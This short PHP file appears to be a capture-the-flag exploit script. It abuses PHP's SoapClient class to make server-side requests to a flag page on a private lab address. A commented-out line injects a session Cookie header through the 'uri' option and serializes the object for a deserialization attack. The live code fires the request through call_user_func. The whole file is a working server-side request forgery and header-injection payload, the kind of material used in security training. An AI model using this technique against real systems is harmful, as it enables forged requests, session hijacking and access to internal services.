<?php




// $data = new SoapClient(null,array('location' => 'http://192.168.3.134:80/flag.php','uri' => 'test^^Cookie:PHPSESSID=8cjeojt3vp0jfvod72m7ndpih3^^cc=cc'));

// $true_1 = serialize($data);

$soap = new SoapClient(null,array('location' => 'http://192.168.3.134/flag.php','uri'	=> 'melody'));

$a = array($soap,'melody');
call_user_func($a);


?>
